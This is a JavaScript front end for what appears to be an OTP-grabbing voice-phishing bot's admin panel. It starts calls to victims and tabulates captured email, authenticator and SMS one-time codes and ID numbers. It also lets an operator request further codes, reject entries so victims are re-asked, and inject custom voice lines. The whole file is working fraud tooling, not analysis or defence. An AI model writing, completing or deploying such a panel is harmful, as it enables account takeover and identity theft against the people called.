const socket = io();
let currentSessionId = null;

function addLog(message, type = 'info') {
    const container = document.getElementById('logsContainer');
    const logEntry = document.createElement('div');
    logEntry.className = `log-entry ${type}`;
    
    let icon = '';
    switch(type) {
        case 'success': icon = '✓'; break;
        case 'warning': icon = '⚠'; break;
        case 'error': icon = '✗'; break;
        default: icon = 'ℹ';
    }
    
    logEntry.innerHTML = `
        <span>${icon}</span>
        <span>${new Date().toLocaleTimeString()}</span>
        <span>${message}</span>
    `;
    
    container.appendChild(logEntry);
    container.scrollTop = container.scrollHeight;
    
    while (container.children.length > 100) {
        container.removeChild(container.firstChild);
    }
}

function playNotificationSound() {
    const audio = new Audio('data:audio/wav;base64,U3RlYWx0aCBzb3VuZCBub3QgYXZhaWxhYmxl');
    audio.play().catch(() => {});
}

async function loadContacts() {
    try {
        const response = await fetch('/api/admin/contacts');
        const contacts = await response.json();
        
        const tbody = document.querySelector('#contactsTable tbody');
        if (contacts.length === 0) {
            tbody.innerHTML = '<tr><td colspan="7" class="loading">No contacts found</td></tr>';
            return;
        }
        
        tbody.innerHTML = contacts.map(contact => `
            <tr>
                <td>${contact.full_name || '-'}</td>
                <td>${contact.phone_number}</td>
                <td>${contact.email_otp || '-'}</td>
                <td>${contact.auth_otp || '-'}</td>
                <td>${contact.phone_otp || '-'}</td>
                <td>${contact.id_number || '-'}</td>
                <td><span class="status-badge status-${contact.status}">${contact.status}</span></td>
            </tr>
        `).join('');
    } catch (error) {
        console.error('Error loading contacts:', error);
    }
}

document.getElementById('callForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const phoneNumber = document.getElementById('phoneNumber').value;
    const fullName = document.getElementById('fullName').value;
    const subject = document.getElementById('subject').value;
    const customIntro = document.getElementById('customIntro').value;
    
    const submitBtn = e.target.querySelector('button[type="submit"]');
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Initiating...';
    
    try {
        const response = await fetch('/api/calls/initiate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone_number: phoneNumber, full_name: fullName, subject, custom_intro: customIntro })
        });
        
        const data = await response.json();
        
        if (data.success) {
            addLog(`Call initiated to ${phoneNumber}`, 'success');
            currentSessionId = data.session_id;
            document.getElementById('callForm').reset();
            loadContacts();
        } else {
            addLog(`Failed: ${data.error}`, 'error');
        }
    } catch (error) {
        addLog(`Error: ${error.message}`, 'error');
    } finally {
        submitBtn.disabled = false;
        submitBtn.innerHTML = '<i class="fas fa-phone-alt"></i> Initiate Call';
    }
});

// Action buttons
document.querySelectorAll('.action-btn').forEach(btn => {
    btn.addEventListener('click', async () => {
        if (!currentSessionId) {
            addLog('No active call selected', 'warning');
            return;
        }
        
        const action = btn.dataset.action;
        
        try {
            const response = await fetch(`/api/admin/request-action/${currentSessionId}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action })
            });
            
            const data = await response.json();
            if (data.success) {
                addLog(`Requested ${action.replace('_', ' ').toUpperCase()} from user`, 'success');
            }
        } catch (error) {
            addLog(`Error requesting action: ${error.message}`, 'error');
        }
    });
});

// Reject button
document.getElementById('rejectDataBtn').addEventListener('click', async () => {
    if (!currentSessionId) {
        addLog('No active call selected', 'warning');
        return;
    }
    
    try {
        const response = await fetch(`/api/admin/reject-data/${currentSessionId}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        });
        
        const data = await response.json();
        if (data.success) {
            addLog(`Rejected: ${data.message}`, 'warning');
            loadContacts();
        } else {
            addLog(`Failed to reject: ${data.message}`, 'error');
        }
    } catch (error) {
        addLog(`Error rejecting data: ${error.message}`, 'error');
    }
});

// Custom voice
document.getElementById('sendCustomVoice').addEventListener('click', async () => {
    if (!currentSessionId) {
        addLog('No active call selected', 'warning');
        return;
    }
    
    const message = document.getElementById('customVoiceMessage').value;
    if (!message) {
        addLog('Please enter a custom message', 'warning');
        return;
    }
    
    try {
        const response = await fetch(`/api/admin/custom-voice/${currentSessionId}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message })
        });
        
        const data = await response.json();
        if (data.success) {
            addLog(`Custom voice sent: "${message}"`, 'success');
            document.getElementById('customVoiceMessage').value = '';
        }
    } catch (error) {
        addLog(`Error sending custom voice: ${error.message}`, 'error');
    }
});

document.getElementById('clearLogs').addEventListener('click', () => {
    const container = document.getElementById('logsContainer');
    container.innerHTML = '<div class="log-entry info">Logs cleared</div>';
});

// SOCKET EVENTS
socket.on('call_initiated', (data) => {
    addLog(`Call initiated to ${data.phone_number}`, 'info');
    currentSessionId = data.session_id;
    loadContacts();
    playNotificationSound();
});

socket.on('user_response', (data) => {
    addLog(`User pressed ${data.value}`, 'success');
    playNotificationSound();
    
    if (data.value === '1') {
        document.getElementById('actionButtons').style.display = 'grid';
        document.getElementById('customVoiceSection').style.display = 'block';
        addLog('CONSENT RECEIVED! Admin buttons are now active.', 'success');
        
        const activeCallDiv = document.getElementById('activeCallInfo');
        if (activeCallDiv) {
            activeCallDiv.innerHTML = `
                <div class="call-info-details">
                    <div>
                        <div class="name">Call Active</div>
                        <div class="phone">Ready for requests - Press 1 received</div>
                    </div>
                    <div class="call-status">
                        <i class="fas fa-check-circle"></i>
                        <span>Consent Given</span>
                    </div>
                </div>
            `;
        }
    }
});

socket.on('data_collected', (data) => {
    addLog(`Data received: ${data.type} = ${data.value}`, 'success');
    playNotificationSound();
    loadContacts();
    
    const notification = document.createElement('div');
    notification.style.cssText = 'position:fixed;bottom:20px;right:20px;background:#10b981;color:white;padding:12px 20px;border-radius:8px;z-index:9999;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.1);';
    notification.innerHTML = `<i class="fas fa-database"></i> ${data.type.toUpperCase()}: ${data.value}`;
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 3000);
});

socket.on('data_rejected', (data) => {
    addLog(`Data REJECTED: ${data.type} = ${data.value} - User will be asked again`, 'warning');
    playNotificationSound();
});

socket.on('admin_action', (data) => {
    addLog(`Admin action: ${data.action}`, 'warning');
});

socket.on('call_status', (data) => {
    addLog(`Call ${data.session_id}: ${data.status} (${data.duration || 0}s)`, 'info');
    if (data.status === 'completed') {
        currentSessionId = null;
        document.getElementById('actionButtons').style.display = 'none';
        document.getElementById('customVoiceSection').style.display = 'none';
        document.getElementById('activeCallInfo').innerHTML = '<div class="no-active">No active call</div>';
    }
});

async function loadActiveCalls() {
    try {
        const response = await fetch('/api/admin/active-calls');
        const calls = await response.json();
        
        const container = document.getElementById('activeCallInfo');
        
        if (calls.length > 0) {
            const call = calls[0];
            currentSessionId = call.session_id;
            container.innerHTML = `
                <div class="call-info-details">
                    <div>
                        <div class="name">${call.full_name || 'Unknown'}</div>
                        <div class="phone">${call.phone_number}</div>
                    </div>
                    <div class="call-status">
                        <i class="fas fa-circle"></i>
                        <span>${call.current_action || 'active'}</span>
                    </div>
                </div>
            `;
        } else {
            container.innerHTML = '<div class="no-active">No active call</div>';
        }
    } catch (error) {
        console.error('Error loading active calls:', error);
    }
}

setInterval(loadActiveCalls, 5000);
loadContacts();
loadActiveCalls();
addLog('System ready. Dashboard connected.', 'success');
